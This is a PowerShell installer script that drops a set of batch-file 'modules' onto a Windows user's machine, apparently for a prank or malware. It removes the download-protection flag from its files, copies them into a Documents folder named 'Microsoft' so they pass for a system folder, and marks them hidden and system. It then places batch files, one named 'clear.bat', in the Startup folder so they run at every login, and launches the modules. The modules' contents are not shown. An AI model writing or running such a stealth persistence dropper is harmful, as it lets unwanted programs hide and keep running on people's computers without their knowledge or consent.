# Settings
$location = Get-Location
$sourcePathSystem = "${location}\system"
$sourcePathLocal = "${location}\local"
$destinationPath = "C:\Users\$env:USERNAME\documents\Microsoft"
$video = 2

# Unblock Files
dir -r | unblock-file

# Copy to System
Robocopy "${sourcePathSystem}" "${destinationPath}" /A+:SH /MIR
copy-item "${location}\extra\vid${video}.mkv" "${destinationPath}\module-2\video.mkv" -Force

# Hide
dir -r "${destinationPath}\" | ForEach-Object { Set-ItemProperty -Path $_.FullName -Name Attributes -Value 6 }

# Move to shell:startup
Move-Item "${destinationPath}\module-2\module-2-START-AUTO.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
Move-Item "${destinationPath}\module-2\clear.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force

# Start Modules
Start-Process "${sourcePathLocal}\module-3\module-3-START.bat"
Start-Process "${destinationPath}\module-2\module-2-START.bat"
Start-Sleep 4
Start-Process "${destinationPath}\module-1\module-1-START.bat"
